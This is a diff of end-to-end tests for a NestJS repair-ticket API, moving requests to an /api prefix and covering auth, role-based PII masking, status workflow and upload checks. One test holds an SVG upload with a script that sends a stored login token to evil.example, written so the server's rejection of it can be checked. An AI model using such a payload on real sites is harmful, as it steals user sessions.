@@ -1,13 +1,15 @@
 import { Test, TestingModule } from '@nestjs/testing';
 import { NestExpressApplication } from '@nestjs/platform-express';
 import request from 'supertest';
-import { join } from 'path';
 import { existsSync, rmSync } from 'fs';
 import { AppModule } from './../src/app.module';
 import { AuthService } from './../src/auth/auth.service';
 import { PrismaService } from './../src/prisma/prisma.service';
 import { NotificationsService } from './../src/notifications/notifications.service';
 import { serveUploads } from './../src/uploads/serve-uploads';
+import { setApiPrefix } from './../src/bootstrap';
+import { apiRequest } from './support/api-request';
+import { uploadFilePath } from './support/upload-file-path';
 import { Role } from '@prisma/client';
 
 // Minimal valid 1x1 PNG (real magic bytes) — required now that uploads are
@@ -74,6 +76,7 @@ describe('Repairs (e2e)', () => {
       .compile();
 
     app = moduleFixture.createNestApplication<NestExpressApplication>();
+    setApiPrefix(app);
     serveUploads(app);
     authService = moduleFixture.get(AuthService);
     prisma = moduleFixture.get(PrismaService);
@@ -116,11 +119,11 @@ describe('Repairs (e2e)', () => {
   });
 
   it('rejects unauthenticated requests', () => {
-    return request(app.getHttpServer()).get('/repairs').expect(401);
+    return apiRequest(app).get('/repairs').expect(401);
   });
 
   it('any authenticated User can submit a Repair Ticket without a photo', async () => {
-    const res = await request(app.getHttpServer())
+    const res = await apiRequest(app)
       .post('/repairs')
       .set('Authorization', `Bearer ${userToken}`)
       .field('location', 'A101 會議室')
@@ -135,7 +138,7 @@ describe('Repairs (e2e)', () => {
   });
 
   it('any authenticated User can submit a Repair Ticket with a photo, and the photo is retrievable', async () => {
-    const res = await request(app.getHttpServer())
+    const res = await apiRequest(app)
       .post('/repairs')
       .set('Authorization', `Bearer ${userToken}`)
       .field('location', '一樓大廳')
@@ -147,9 +150,10 @@ describe('Repairs (e2e)', () => {
       .expect(201);
 
     const body = res.body as RepairTicketResponse;
-    expect(body.imageUrl).toMatch(/^\/uploads\/repairs\/.+\.png$/);
-    createdUploadPaths.push(join(process.cwd(), body.imageUrl as string));
+    expect(body.imageUrl).toMatch(/^\/api\/uploads\/repairs\/.+\.png$/);
+    createdUploadPaths.push(uploadFilePath(body.imageUrl as string));
 
+    // Not apiRequest: imageUrl already includes the API prefix.
     const photoRes = await request(app.getHttpServer())
       .get(body.imageUrl as string)
       .expect(200);
@@ -158,7 +162,7 @@ describe('Repairs (e2e)', () => {
   });
 
   it("hides a reporter's phone/class and masks their name from other USER-role callers", async () => {
-    const created = await request(app.getHttpServer())
+    const created = await apiRequest(app)
       .post('/repairs')
       .set('Authorization', `Bearer ${userToken}`)
       .field('location', 'PII 過濾測試')
@@ -169,7 +173,7 @@ describe('Repairs (e2e)', () => {
       .expect(201);
     const createdBody = created.body as RepairTicketResponse;
 
-    const asOtherUser = await request(app.getHttpServer())
+    const asOtherUser = await apiRequest(app)
       .get('/repairs')
       .set('Authorization', `Bearer ${otherUserToken}`)
       .expect(200);
@@ -180,7 +184,7 @@ describe('Repairs (e2e)', () => {
     expect(seenByOtherUser?.userClass).toBeNull();
     expect(seenByOtherUser?.userName).not.toBe(createdBody.userName);
 
-    const asOwner = await request(app.getHttpServer())
+    const asOwner = await apiRequest(app)
       .get('/repairs')
       .set('Authorization', `Bearer ${userToken}`)
       .expect(200);
@@ -191,7 +195,7 @@ describe('Repairs (e2e)', () => {
     expect(seenByOwner?.userClass).toBe('資訊三甲');
     expect(seenByOwner?.userName).toBe(createdBody.userName);
 
-    const asAdmin = await request(app.getHttpServer())
+    const asAdmin = await apiRequest(app)
       .get('/repairs')
       .set('Authorization', `Bearer ${adminToken}`)
       .expect(200);
@@ -201,7 +205,7 @@ describe('Repairs (e2e)', () => {
     expect(seenByAdmin?.userPhone).toBe('0912-345-678');
     expect(seenByAdmin?.userClass).toBe('資訊三甲');
 
-    const asMaintenance = await request(app.getHttpServer())
+    const asMaintenance = await apiRequest(app)
       .get('/repairs')
       .set('Authorization', `Bearer ${maintenanceToken}`)
       .expect(200);
@@ -216,7 +220,7 @@ describe('Repairs (e2e)', () => {
     const svgPayload = Buffer.from(
       '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch(\'https://evil.example/collect?t=\'+localStorage.getItem(\'meetfix_token\'))</script></svg>',
     );
-    return request(app.getHttpServer())
+    return apiRequest(app)
       .post('/repairs')
       .set('Authorization', `Bearer ${userToken}`)
       .field('location', '一樓大廳')
@@ -230,7 +234,7 @@ describe('Repairs (e2e)', () => {
   });
 
   it('rejects a photo upload whose content is not a real image, regardless of declared filename/mimetype', () => {
-    return request(app.getHttpServer())
+    return apiRequest(app)
       .post('/repairs')
       .set('Authorization', `Bearer ${userToken}`)
       .field('location', '一樓大廳')
@@ -244,7 +248,7 @@ describe('Repairs (e2e)', () => {
   });
 
   it('rejects submission missing required fields', () => {
-    return request(app.getHttpServer())
+    return apiRequest(app)
       .post('/repairs')
       .set('Authorization', `Bearer ${userToken}`)
       .field('location', 'A101')
@@ -252,7 +256,7 @@ describe('Repairs (e2e)', () => {
   });
 
   it('rejects submission with a category that is not in the Admin-managed list', () => {
-    return request(app.getHttpServer())
+    return apiRequest(app)
       .post('/repairs')
       .set('Authorization', `Bearer ${userToken}`)
       .field('location', 'A101')
@@ -262,7 +266,7 @@ describe('Repairs (e2e)', () => {
   });
 
   it('a Repair Ticket tied to a real Room defaults its location to the Room name', async () => {
-    const res = await request(app.getHttpServer())
+    const res = await apiRequest(app)
       .post('/repairs')
       .set('Authorization', `Bearer ${userToken}`)
       .field('roomId', roomId)
@@ -276,7 +280,7 @@ describe('Repairs (e2e)', () => {
   });
 
   it('rejects a Repair Ticket tied to a Room that does not exist', () => {
-    return request(app.getHttpServer())
+    return apiRequest(app)
       .post('/repairs')
       .set('Authorization', `Bearer ${userToken}`)
       .field('roomId', 'not-a-real-room')
@@ -287,7 +291,7 @@ describe('Repairs (e2e)', () => {
 
   describe('Repair Ticket processing (Maintenance)', () => {
     async function createTicket(): Promise<string> {
-      const res = await request(app.getHttpServer())
+      const res = await apiRequest(app)
         .post('/repairs')
         .set('Authorization', `Bearer ${userToken}`)
         .field('location', 'C303 教室')
@@ -299,7 +303,7 @@ describe('Repairs (e2e)', () => {
 
     it('rejects updates from a non-MAINTENANCE, non-ADMIN User', async () => {
       const id = await createTicket();
-      await request(app.getHttpServer())
+      await apiRequest(app)
         .patch(`/repairs/${id}`)
         .set('Authorization', `Bearer ${userToken}`)
         .send({ status: 'IN_PROGRESS' })
@@ -309,7 +313,7 @@ describe('Repairs (e2e)', () => {
     it('MAINTENANCE can move a ticket PENDING -> IN_PROGRESS -> COMPLETED', async () => {
       const id = await createTicket();
 
-      const started = await request(app.getHttpServer())
+      const started = await apiRequest(app)
         .patch(`/repairs/${id}`)
         .set('Authorization', `Bearer ${maintenanceToken}`)
         .send({ status: 'IN_PROGRESS' })
@@ -318,7 +322,7 @@ describe('Repairs (e2e)', () => {
         'IN_PROGRESS',
       );
 
-      const completed = await request(app.getHttpServer())
+      const completed = await apiRequest(app)
         .patch(`/repairs/${id}`)
         .set('Authorization', `Bearer ${maintenanceToken}`)
         .send({ status: 'COMPLETED' })
@@ -330,7 +334,7 @@ describe('Repairs (e2e)', () => {
 
     it('ADMIN can also move a ticket through the workflow', async () => {
       const id = await createTicket();
-      const res = await request(app.getHttpServer())
+      const res = await apiRequest(app)
         .patch(`/repairs/${id}`)
         .set('Authorization', `Bearer ${adminToken}`)
         .send({ status: 'IN_PROGRESS' })
@@ -340,7 +344,7 @@ describe('Repairs (e2e)', () => {
 
     it('rejects skipping a status (PENDING -> COMPLETED)', async () => {
       const id = await createTicket();
-      await request(app.getHttpServer())
+      await apiRequest(app)
         .patch(`/repairs/${id}`)
         .set('Authorization', `Bearer ${maintenanceToken}`)
         .send({ status: 'COMPLETED' })
@@ -349,18 +353,18 @@ describe('Repairs (e2e)', () => {
 
     it('rejects moving a COMPLETED ticket back to PENDING', async () => {
       const id = await createTicket();
-      await request(app.getHttpServer())
+      await apiRequest(app)
         .patch(`/repairs/${id}`)
         .set('Authorization', `Bearer ${maintenanceToken}`)
         .send({ status: 'IN_PROGRESS' })
         .expect(200);
-      await request(app.getHttpServer())
+      await apiRequest(app)
         .patch(`/repairs/${id}`)
         .set('Authorization', `Bearer ${maintenanceToken}`)
         .send({ status: 'COMPLETED' })
         .expect(200);
 
-      await request(app.getHttpServer())
+      await apiRequest(app)
         .patch(`/repairs/${id}`)
         .set('Authorization', `Bearer ${maintenanceToken}`)
         .send({ status: 'PENDING' })
@@ -369,7 +373,7 @@ describe('Repairs (e2e)', () => {
 
     it('MAINTENANCE can attach a reply when updating a ticket', async () => {
       const id = await createTicket();
-      const res = await request(app.getHttpServer())
+      const res = await apiRequest(app)
         .patch(`/repairs/${id}`)
         .set('Authorization', `Bearer ${maintenanceToken}`)
         .send({ status: 'IN_PROGRESS', adminReply: '已預約零件，明日到場處理' })
@@ -380,7 +384,7 @@ describe('Repairs (e2e)', () => {
     });
 
     it('404s when updating a Repair Ticket that does not exist', () => {
-      return request(app.getHttpServer())
+      return apiRequest(app)
         .patch('/repairs/not-a-real-ticket')
         .set('Authorization', `Bearer ${maintenanceToken}`)
         .send({ status: 'IN_PROGRESS' })
@@ -389,7 +393,7 @@ describe('Repairs (e2e)', () => {
 
     it('notifies the reporting User on a status change (#10)', async () => {
       const id = await createTicket();
-      await request(app.getHttpServer())
+      await apiRequest(app)
         .patch(`/repairs/${id}`)
         .set('Authorization', `Bearer ${maintenanceToken}`)
         .send({ status: 'IN_PROGRESS' })
@@ -400,7 +404,7 @@ describe('Repairs (e2e)', () => {
 
     it('notifies the reporting User on a reply-only update (#10)', async () => {
       const id = await createTicket();
-      await request(app.getHttpServer())
+      await apiRequest(app)
         .patch(`/repairs/${id}`)
         .set('Authorization', `Bearer ${maintenanceToken}`)
         .send({ adminReply: '正在調度零件' })
@@ -412,7 +416,7 @@ describe('Repairs (e2e)', () => {
 
   describe('Repair Categories', () => {
     it('any authenticated User can list Repair Categories', async () => {
-      const res = await request(app.getHttpServer())
+      const res = await apiRequest(app)
         .get('/repair-categories')
         .set('Authorization', `Bearer ${userToken}`)
         .expect(200);
@@ -420,7 +424,7 @@ describe('Repairs (e2e)', () => {
     });
 
     it('rejects category creation by a non-Admin User', () => {
-      return request(app.getHttpServer())
+      return apiRequest(app)
         .post('/repair-categories')
         .set('Authorization', `Bearer ${userToken}`)
         .send({ name: 'Test Category Denied' })
@@ -428,7 +432,7 @@ describe('Repairs (e2e)', () => {
     });
 
     it('Admin can create and remove a Repair Category', async () => {
-      const created = await request(app.getHttpServer())
+      const created = await apiRequest(app)
         .post('/repair-categories')
         .set('Authorization', `Bearer ${adminToken}`)
         .send({ name: 'Test Category A' })
@@ -436,34 +440,34 @@ describe('Repairs (e2e)', () => {
       const body = created.body as RepairCategoryResponse;
       expect(body.name).toBe('Test Category A');
 
-      await request(app.getHttpServer())
+      await apiRequest(app)
         .delete(`/repair-categories/${body.id}`)
         .set('Authorization', `Bearer ${adminToken}`)
         .expect(204);
     });
 
     it('rejects category deletion by a non-Admin User', async () => {
-      const created = await request(app.getHttpServer())
+      const created = await apiRequest(app)
         .post('/repair-categories')
         .set('Authorization', `Bearer ${adminToken}`)
         .send({ name: 'Test Category B' })
         .expect(201);
       const body = created.body as RepairCategoryResponse;
 
-      await request(app.getHttpServer())
+      await apiRequest(app)
         .delete(`/repair-categories/${body.id}`)
         .set('Authorization', `Bearer ${userToken}`)
         .expect(403);
     });
 
     it('rejects creating a duplicate Repair Category', async () => {
-      await request(app.getHttpServer())
+      await apiRequest(app)
         .post('/repair-categories')
         .set('Authorization', `Bearer ${adminToken}`)
         .send({ name: 'Test Category C' })
         .expect(201);
 
-      await request(app.getHttpServer())
+      await apiRequest(app)
         .post('/repair-categories')
         .set('Authorization', `Bearer ${adminToken}`)
         .send({ name: 'Test Category C' })
